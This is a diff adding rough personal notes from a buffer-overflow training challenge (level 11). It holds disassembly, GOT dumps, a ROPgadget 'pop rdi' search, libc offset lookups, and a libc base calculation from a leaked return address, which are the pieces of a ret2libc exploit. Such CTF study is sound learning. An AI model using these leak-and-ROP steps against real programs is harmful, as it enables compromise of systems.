@@ -326,3 +326,152 @@ hacker@buffer-overflow-level-10:/challenge$ objdump -T /lib/x86_64-linux-gnu/lib
 hacker@buffer-overflow-level-10:/challenge$ 
 
 disassemble main # prints disassembly of main function
+
+
+====================================== 11 ==============================================
+0000000000001330 <win>:
+buffer = 0x2f0 = 752
+read = 0x3f0 = 1008
+
+16ca:	e8 a1 fa ff ff       	callq  1170 <printf@plt>
+16cf:	48 8d 85 00 fd ff ff 	lea    -0x300(%rbp),%rax
+16d6:	ba f0 03 00 00       	mov    $0x3f0,%edx
+16db:	48 89 c6             	mov    %rax,%rsi
+16de:	bf 00 00 00 00       	mov    $0x0,%edi
+16e3:	e8 c8 fa ff ff       	callq  11b0 <read@plt>
+
+0000000000001130 <puts@plt>:
+    1130:	f3 0f 1e fa          	endbr64 
+    1134:	f2 ff 25 e5 2e 00 00 	bnd jmpq *0x2ee5(%rip)        # 4020 <puts@GLIBC_2.2.5>
+    113b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 14
+ 
+[0x5646aea24018] putchar@GLIBC_2.2.5  →  0x5646aea21030
+[0x5646aea24020] puts@GLIBC_2.2.5  →  0x5646aea21040
+[0x5646aea24028] strlen@GLIBC_2.2.5  →  0x5646aea21050
+[0x5646aea24030] __stack_chk_fail@GLIBC_2.4  →  0x5646aea21060
+[0x5646aea24038] setbuf@GLIBC_2.2.5  →  0x7fdbbd834ad0
+[0x5646aea24040] printf@GLIBC_2.2.5  →  0x5646aea21080
+[0x5646aea24048] __assert_fail@GLIBC_2.2.5  →  0x5646aea21090
+[0x5646aea24050] memset@GLIBC_2.2.5  →  0x5646aea210a0
+[0x5646aea24058] close@GLIBC_2.2.5  →  0x5646aea210b0
+[0x5646aea24060] read@GLIBC_2.2.5  →  0x5646aea210c0
+[0x5646aea24068] sendfile@GLIBC_2.2.5  →  0x5646aea210d0
+[0x5646aea24070] open@GLIBC_2.2.5  →  0x5646aea210e0
+[0x5646aea24078] __isoc99_scanf@GLIBC_2.7  →  0x5646aea210f0
+[0x5646aea24080] exit@GLIBC_2.2.5  →  0x5646aea21100
+
+
+0x5646aea24080 + 0x300 = 0x5646aea24380
+
+hacker@buffer-overflow-level-11:/challenge$ ROPgadget --binary babystack_level11 | grep 'pop rdi'
+0x0000000000001773 : pop rdi ; ret
+
+hacker@buffer-overflow-level-11:/challenge$ objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep puts
+0000000000084420 g    DF .text	00000000000001dc  GLIBC_2.2.5 _IO_puts
+0000000000084420  w   DF .text	00000000000001dc  GLIBC_2.2.5 puts
+0000000000124330 g    DF .text	00000000000004f4  GLIBC_2.2.5 putspent
+0000000000126000 g    DF .text	00000000000002d8  GLIBC_2.10  putsgent
+0000000000082ce0  w   DF .text	0000000000000180  GLIBC_2.2.5 fputs
+0000000000082ce0 g    DF .text	0000000000000180  GLIBC_2.2.5 _IO_fputs
+000000000008e320  w   DF .text	000000000000009f  GLIBC_2.2.5 fputs_unlocked
+hacker@buffer-overflow-level-11:/challenge$ 
+
+
+gef➤  info frame
+│Stack level 0, frame at 0x7ffcc3b922a0:
+│ rip = 0x55d80d58d37f in main; saved rip = 0x7f124ccd9083
+│ Arglist at 0x7ffcc3b92290, args: 
+│ Locals at 0x7ffcc3b92290, Previous frame's sp is 0x7ffcc3b922a0
+│ Saved registers:
+│  rip at 0x7ffcc3b92298
+│gef➤  
+
+
+def hex_char(i):
+    l = ['A','B','C','D','E','F']
+    j = i
+    s1 =""
+    if i >= 10:
+        s1 = s1 + l[j-10]
+    else:
+        s1 = s1 + str(j)
+    # print(s1)
+    return s1
+        
+for i in range(16):
+    s1 = hex_char(i)
+    for j in range(16):
+        s2 = hex_char(j)
+        new_str = r'\x83\x{}{}'.format(s1, s2)
+        print(new_str)
+
+gef➤  info frame
+Stack level 0, frame at 0x7fff4240fe50:
+ rip = 0x561dbe57937f in main; saved rip = 0x7f1d1ff66083
+ Arglist at 0x7fff4240fe40, args: 
+ Locals at 0x7fff4240fe40, Previous frame's sp is 0x7fff4240fe50
+ Saved registers:
+  rip at 0x7fff4240fe48
+gef➤  x 0x7f1d1ff66083
+0x7f1d1ff66083 <__libc_start_main+243>:	0xb6e8c789
+gef➤  x/10i 0x7f1d1ff66083
+   0x7f1d1ff66083 <__libc_start_main+243>:	mov    edi,eax                            // return address
+   0x7f1d1ff66085 <__libc_start_main+245>:	call   0x7f1d1ff88a40 <__GI_exit>
+   0x7f1d1ff6608a <__libc_start_main+250>:	mov    rax,QWORD PTR [rsp+0x8]
+   0x7f1d1ff6608f <__libc_start_main+255>:	lea    rdi,[rip+0x18fdd2]        # 0x7f1d200f5e68
+   0x7f1d1ff66096 <__libc_start_main+262>:	mov    rsi,QWORD PTR [rax]
+   0x7f1d1ff66099 <__libc_start_main+265>:	xor    eax,eax
+   0x7f1d1ff6609b <__libc_start_main+267>:	call   QWORD PTR [rdx+0x1d0]
+   0x7f1d1ff660a1 <__libc_start_main+273>:	jmp    0x7f1d1ff65ff6 <__libc_start_main+102>
+   0x7f1d1ff660a6 <__libc_start_main+278>:	mov    rax,QWORD PTR [rip+0x1cd3cb]        # 0x7f1d20133478 <__libc_pthread_functions+312>
+   0x7f1d1ff660ad <__libc_start_main+285>:	ror    rax,0x11
+gef➤      
+      
+
+ 0x00007f1d1ff66083 <+243>:	mov    edi,eax
+
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
+ 2238: 0000000000023f90   483 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.2.5
+
+ base = int(leak[:-1],16) - 0x23f90 - 0xF3  # <__libc_start_main+243>    0xF3 = 243
+
+│gef➤  x 0x7ffc7b46a080
+│0x7ffc7b46a080: 0x4242424242424242
+│gef➤  x/gx 0x7ffc7b46a080
+│0x7ffc7b46a080: 0x4242424242424242
+│gef➤  x (0x7ffc7b46a080-8)
+│0x7ffc7b46a078: 0xd62854c180c5eb00
+│gef➤  x buf
+│0x0:    Cannot access memory at address 0x0
+│gef➤  p addr
+│No symbol "addr" in current context.
+│gef➤  p &addr
+│No symbol "addr" in current context.
+│gef➤  print &addr
+│No symbol "addr" in current context.
+│gef➤  print &value
+│No symbol "value" in current context.
+│gef➤  print &buffer
+│$1 = (char (*)[30]) 0x7fbb780f5160 <buffer>
+│gef➤  x 0x7fbb780f5160
+│0x7fbb780f5160 <buffer>:        0x0000000000000000
+│gef➤  x (0x7ffc7b46a080+8)
+│0x7ffc7b46a088: 0x00007fbb77f2800a
+│gef➤  info frame
+│Stack level 0, frame at 0x7ffc7b46a090:
+│ rip = 0x564c461aa6e8 in main; saved rip = 0x7fbb77f2800a
+│ Arglist at 0x7ffc7b469d28, args: 
+│ Locals at 0x7ffc7b469d28, Previous frame's sp is 0x7ffc7b46a090
+│ Saved registers:
+│  rbp at 0x7ffc7b46a080, rip at 0x7ffc7b46a088
+│gef➤  x 0x564c461aa6e8
+│0x564c461aa6e8 <main+873>:      0x4d8b4800000000b8
+│gef➤  x 0x7fbb77f2800a
+│0x7fbb77f2800a <__libc_start_main+122>: 0x8b48d3ff108b4814
+│gef➤  
+
